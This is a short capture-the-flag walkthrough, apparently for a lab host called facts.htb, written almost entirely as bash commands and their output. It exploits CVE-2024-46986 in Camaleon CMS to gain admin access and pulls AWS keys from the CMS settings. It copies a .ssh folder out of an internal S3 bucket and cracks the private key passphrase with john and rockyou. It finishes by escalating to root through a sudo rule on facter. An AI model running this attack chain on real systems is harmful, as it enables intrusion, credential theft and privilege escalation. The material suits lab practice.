```bash
1) creat new admin on http://facts.htb/ and  explpit CVE-2024-46986 in Camaleon CMS 2.9 to priv esc to admin
2) in http://facts.htb/admin/settings/site find the Aws s3 access/secret  key (*)
3) 
aws configure 

aws s3 ls  --endpoint-url http://facts.htb:54321               
2025-09-11 13:06:52 internal
2025-09-11 13:06:52 randomfacts

 aws s3 ls s3://internal/  --endpoint-url http://facts.htb:54321                                                                                                                      252 ↵
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/

aws s3 cp s3://internal/.ssh . --endpoint-url http://facts.htb:54321 --recursive 

ssh2john id_ed25519 > id_ed25519.hash 

john id_ed25519.hash --wordlist=/usr/share/wordlists/rockyou.txt


FIND : dragonballz      (id_ed25519)


4 ) 
ssh-keygen -p -f id_ed25519_nopass
Key has comment 'trivia@facts.htb'
Enter new passphrase (empty for no passphrase): 

sh-keygen -y -f id_ed25519_nopass                                                 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF0wbeQ6pMvqKAsXc3EA2jM2k3n3UOceebil+skcOzhv trivia@facts.htb

ssh trivia@facts.htb -i id_ed25519_nopass 


5) trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter

sudo /usr/bin/facter 


sudo facter --custom-dir=/home/trivia x

# root 
```